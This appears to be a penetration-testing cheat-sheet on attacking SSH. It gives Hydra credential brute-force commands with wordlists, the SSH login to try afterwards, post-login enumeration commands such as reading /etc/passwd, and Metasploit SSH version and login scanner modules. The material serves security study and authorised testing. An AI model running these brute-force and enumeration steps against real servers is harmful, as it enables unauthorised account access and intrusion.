# Exploiting SSH
> SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet. SSH is typically used for remote access to servers and system. 

SSH Default Port: `22`

## Contents
- [Intro](#)
- [Hydra: Brute Force](#)
- [MetaSploit](#)
  - [SSH Version Info](#)
  - [SSH Login: Brute Force](#)

## Intro

- SSH used TCP port 22 by default, however (like many other services) it can be configured to use any other open TCP port.
- SSH authentication can be configured in two ways:
  - Username and password authentication
    - Therefore, we can perform a brute-force attack on the SSH server in order to identify legitimate credentials and consequently gain access to the target system.
  - Key-based authentication (no username/password)
    - The user's public key is copied to the server
    - The user's private key is used to login

## [Hydra](../../hydra.md): Brute Force
```
hydra -L /usr/share/.../common_users.txt -P /usr/share/.../unix_passwords.txt -t 4 ssh://[target ip]
or
hydra -L /usr/share/.../common_users.txt -P /usr/share/.../unix_passwords.txt -t 4 [target ip] ssh
```
- `-t 4` : Limits the number of threads so you don't DoS the SSH server.
- If this gets you logins, try them out: 
```
ssh [remote_username]@[remote_host]
```
- Then enumerate basic info: `whoami`, `groups sysadmin`, `cat /etc/*issue`, `uname -r`, `cat /etc/passwd`

## MetaSploit

### SSH Version Info
```
> use auxiliary/scanner/ssh/ssh_version
```
- Use the results to Google around and see if the version is vulnerable.

### SSH Login: Brute Force
```
> use auxiliary/scanner/ssh/ssh_login
```
- username dictionary (one of many): /usr/share/metasploit-framework/data/wordlists/common_users.txt
- password dctionary (one of many): /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
- If MSF finds login cred pairs, it will use them to open sessions on each one it finds.
